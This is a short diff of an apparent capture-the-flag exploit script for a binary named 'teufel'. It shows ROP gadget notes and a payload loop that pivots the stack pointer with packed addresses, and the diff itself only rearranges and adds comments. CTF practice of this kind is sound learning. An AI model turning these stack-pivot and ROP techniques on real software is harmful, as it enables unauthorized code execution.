@@ -65,10 +65,6 @@ if __name__ == "__main__":
 
     ORIGINAL_RSP = mmap + 0x2000
 
-# $ ROPgadget --binary teufel
-#
-# 0x400532 : mov rsp, rbp; pop rbp; ret
-#
 # pmap `pidof tuefel`
 #
 # 00007f74d6fd7000 4K -----
@@ -86,10 +82,12 @@ if __name__ == "__main__":
 # ---------------------
 #
 # we can use the gadget to move down RSP just a little bit
+#
+# 0x400532 : mov rsp, rbp; pop rbp; ret
 
     for i in xrange(0,10): # move down rsp by 0x10 at a time
         payload = p64(24)
-        payload += p64(0x4004d7)
+        payload += p64(0x4004d7) # call sub_4004E6(). At the end of 0x400532 gadget, rsp will be here ( -8 is for pop rbp )
         payload += p64(ORIGINAL_RSP - 24 - 0x10*i - 8)
         payload += p64(0x400532)
         r.send(payload)
